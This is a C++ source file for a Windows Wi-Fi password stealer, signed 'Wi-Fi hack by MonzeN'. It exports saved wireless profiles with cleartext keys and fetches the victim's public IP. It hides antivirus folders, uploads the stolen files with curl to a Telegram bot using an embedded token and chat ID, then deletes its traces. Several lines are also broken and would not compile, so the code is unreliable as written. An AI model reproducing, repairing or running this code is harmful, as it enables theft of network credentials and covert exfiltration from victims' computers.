#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include <vector>
#include <Windows.h>
#include <WinInet.h>
#include <urlmon.h>
#include <sstream>

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;

void start(string name) {
    string user = getenv("USERNAME");
    string filepath = "C:/Users/"+ user + "/Desktop/wifi/.bat/" + name + ".bat";
    string command = "runas /user:"+ user + " \"" + filepath + "\"";
    system(command.c_str());
}

int main() {
    string TOKEN = "5311713070:AAE2bzgCgeybLBaeO2pu9Muol5haf1g6YMY";
    string CHAT_ID = "1434743208";
    string url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument?chat_id=" + CHAT_ID;

    vector<string> Antivirus = { "Windows Defender", "Avast", "AVG", "Avira",
                                 "Advanced SystemCare", "Bitdefender", "Dr.Web",
                                 "ESET", "Kaspersky Lab", "360 Total Security",
                                 "ESET NOD32" };
    vector<string> paths = { "C:\\Program Files\\Windows Defender",
                             "C:\\Program Files\\AVAST Software\\Avast",
                             "C:\\Program Files\\AVG\\Antivirus",
                             "C:\\Program Files (x86)\\Avira\\Launcher",
                             "C:\\Program Files (x86)\\IObit\\Advanced SystemCare",
                             "C:\\Program Files\\Bitdefender Antivirus Free",
                             "C:\\Program Files\\DrWeb",
                             "C:\\Program Files\\ESET\\ESET Security",
                             "C:\\Program Files (x86)\\Kaspersky Lab",
                             "C:\\Program Files (x86)\\360\\Total Security",
                             "C:\\Program Files\\ESET\\ESET NOD32 Antivirus" };
    for (string path : paths) {
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
            Antivirus.push_back(path);
        }
    }

    string wlanlist[] = { "wlan10", "wlan7", "wlanXP" };

    string system = OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);
    if (osvi.dwMajorVersion == "10") {
        start(wlanlist[0]);
    }
    else if (osvi.dwMajorVersion == "7") {
        start(wlanlist[1]);
    }
    else if (osvi.dwMajorVersion == "XP") {
        start(wlanlist[2]);
    }

    system("netsh wlan export profile key=clear");
    string ip = "";
    HRESULT hr = URLDownloadToCacheFile(NULL, "http://myip.dnsomatic.com/", "get_ip", 0, 0);
    if (hr == S_OK) {
        ifstream fin("get_ip");
        getline(fin, ip);
        fin.close();
    }

    for (string file : Antivirus) {
        string command = "attrib +h \"" + file + "\"";
        system(command.c_str());
    }

    for (string file : Antivirus) {
        string path = file + "/Wi-Fi.xml";
        string command = "attrib -h \"" + path + "\"";
        system(command.c_str());
        stringstream ss;
        ss << "curl --upload-file " << path << " " << url;
        system(ss.str().c_str());
    }

    string path = "get_ip";
    stringstream ss;
    ss << "curl --upload-file " << path << " " << url;
    system(ss.str().c_str());

    string message = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=html&text=Wi-Fi hack by MonzeN";
    system(message.c_str());

    for (string file : Antivirus) {
        string path = file + "/Wi-Fi.xml";
        string command = "del " + path;
        system(command.c_str());
    }

    string command = "del get_ip";
    system(command.c_str());

    return 0;
}